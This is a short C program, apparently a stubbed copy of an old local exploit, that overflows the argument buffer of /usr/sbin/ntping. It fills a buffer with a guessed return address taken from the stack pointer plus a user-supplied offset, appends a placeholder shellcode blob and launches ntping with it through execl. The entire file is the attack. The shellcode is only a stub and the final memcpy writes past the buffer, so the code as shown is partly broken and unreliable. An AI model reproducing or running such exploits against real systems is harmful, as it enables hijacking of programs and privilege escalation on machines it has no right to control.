
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int LEN ;
 long atoi (char*) ;
 int execl (char*,char*,char*,int ,int ) ;
 long get_sp () ;
 int memcpy (char*,int ,int ) ;
 int printf (char*,long,int) ;
 int shellcode ;
 int strlen (int ) ;

int
main (int argc, char *argv[])
{
  char buffer[LEN];
  int i;

  long retaddr = get_sp ();


  for (i = 0; i < LEN; i += 4)
    *(long *) &buffer[i] = retaddr + atoi (argv[1]);




  printf ("Jumping to address %x BufSize %d\n", retaddr + atoi (argv[1]),LEN);





  memcpy (buffer + i, shellcode, strlen (shellcode));

  execl ("/usr/sbin/ntping", "ntping", buffer,0, 0);

}
